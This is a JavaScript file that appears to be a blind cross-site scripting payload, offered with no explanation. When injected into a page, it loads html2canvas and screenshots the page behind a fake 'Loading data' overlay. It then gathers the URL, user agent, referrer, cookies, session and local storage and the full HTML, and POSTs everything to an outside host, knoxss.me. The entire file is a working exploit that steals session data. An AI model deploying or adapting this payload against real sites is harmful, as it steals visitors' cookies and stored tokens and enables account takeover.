const script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js';
document.head.appendChild(script);

let base64image;

script.onload = function() {
    html2canvas(document.documentElement, {
        windowWidth: document.documentElement.scrollWidth,  // Độ rộng toàn bộ trang
        windowHeight: document.documentElement.scrollHeight // Chiều cao toàn bộ trang
    }).then(canvas => {
        base64image = canvas.toDataURL("image/png");

        const loadingOverlay = document.createElement('div');
        loadingOverlay.style.position = 'fixed';
        loadingOverlay.style.top = 0;
        loadingOverlay.style.left = 0;
        loadingOverlay.style.right = 0;
        loadingOverlay.style.bottom = 0;
        loadingOverlay.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loadingOverlay.style.display = 'flex';
        loadingOverlay.style.alignItems = 'center';
        loadingOverlay.style.justifyContent = 'center';
        loadingOverlay.style.zIndex = 9999;

        const loadingContent = document.createElement('div');
        loadingContent.style.textAlign = 'center';
        
        const spinner = document.createElement('div');
        spinner.style.border = '4px solid rgba(0, 0, 0, 0.1)';
        spinner.style.borderLeftColor = '#000';
        spinner.style.borderRadius = '50%';
        spinner.style.width = '40px';
        spinner.style.height = '40px';
        spinner.style.animation = 'spin 1s linear infinite';
        spinner.style.marginBottom = '10px';

        const style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);

        const loadingText = document.createElement('p');
        loadingText.innerText = 'Loading data, please wait...';

        loadingContent.appendChild(spinner);
        loadingContent.appendChild(loadingText);

        loadingOverlay.appendChild(loadingContent);

        document.body.appendChild(loadingOverlay);

        var msg = 'VULNERABLE URL\n' + '';
        msg += '\n\nTRIGGER URL:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.URL + '\n\nUSER AGENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + navigator.userAgent;
        msg += '\n\nREFERRER URL\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.referrer + '\n\nREADABLE COOKIES\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.cookie;
        msg += '\n\nSESSION STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(localStorage); 
        msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
        msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;

        var r = new XMLHttpRequest();
        var mailer = 'https://knoxss.me/00';
        r.open('POST', mailer, true);
        r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
        console.log('Mission completed!');

        loadingOverlay.style.display = 'none';
    });
};
